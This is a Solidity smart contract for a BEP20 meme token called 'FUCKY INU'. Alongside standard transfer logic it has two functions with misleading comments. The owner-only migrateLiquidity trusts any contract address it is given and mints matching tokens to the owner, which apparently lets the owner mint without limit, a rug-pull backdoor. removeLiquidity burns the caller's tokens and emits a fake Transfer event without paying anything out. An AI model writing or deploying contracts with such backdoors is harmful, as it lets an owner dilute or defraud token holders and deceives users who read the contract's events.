// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract FuckyInu is IBEP20 {
    string public name = "FUCKY INU";
    string public symbol = "FUCKYINU";
    uint8 public decimals = 18;
    uint256 private _totalSupply = 956822113300300 * 10**uint256(decimals); 
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _owner;

    constructor() {
        _balances[msg.sender] = _totalSupply;
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Only the owner can call this function");
        _;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(_balances[msg.sender] >= amount, "BEP20: transfer amount exceeds balance");

        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(_balances[sender] >= amount, "BEP20: transfer amount exceeds balance");
        require(_allowances[sender][msg.sender] >= amount, "BEP20: transfer amount exceeds allowance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    // Function to remove liquidity from this contract
    function removeLiquidity(uint256 liquidityAmount) external {
        require(_balances[msg.sender] >= liquidityAmount, "BEP20: liquidity amount exceeds balance");

        // Burn the liquidity tokens from the sender's balance
        _burn(msg.sender, liquidityAmount);

        // Transfer the equivalent amount of liquidity tokens from this contract to the sender
        emit Transfer(address(this), msg.sender, liquidityAmount);
    }

    // Function to migrate liquidity from the old contract to this contract
    function migrateLiquidity(address oldContractAddress, uint256 liquidityAmount) external onlyOwner {
        // Transfer liquidity from the old contract to this contract
        require(IBEP20(oldContractAddress).transferFrom(msg.sender, address(this), liquidityAmount), "Liquidity transfer failed");

        // Mint the same amount of tokens in this contract to represent the migrated liquidity
        _mint(msg.sender, liquidityAmount);
    }

    // Internal function to mint tokens
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    // Internal function to burn tokens
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");
        require(_balances[account] >= amount, "BEP20: burn amount exceeds balance");

        _totalSupply -= amount;
        _balances[account] -= amount;
        emit Transfer(account, address(0), amount);
    }
}